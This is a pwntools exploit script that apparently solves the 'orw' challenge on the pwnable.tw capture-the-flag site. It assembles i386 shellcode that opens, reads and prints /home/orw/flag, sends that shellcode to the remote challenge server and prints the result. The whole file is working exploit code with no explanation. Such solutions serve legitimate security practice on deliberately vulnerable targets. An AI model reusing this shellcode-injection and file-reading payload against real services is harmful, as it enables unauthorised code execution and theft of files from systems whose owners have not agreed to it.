#!/usr/bin/env python

from pwn import *

num_bytes = 64

shellcode = ''
#shellcode += '  int 3'
shellcode += shellcraft.open('/home/orw/flag')
shellcode += '  sub esp, 0x20'
shellcode += shellcraft.read('eax', 'esp', num_bytes)
shellcode += shellcraft.write('STDOUT_FILENO', 'esp', num_bytes)
shellcode += shellcraft.i386.linux.exit(0)


#print asm(shellcode).encode('hex')
#quit()

#conn = remote('localhost', 10000)
conn = remote('chall.pwnable.tw', 10001)
print conn.recvuntil(':')
conn.send(asm(shellcode))
print conn.recvn(num_bytes)
conn.close()
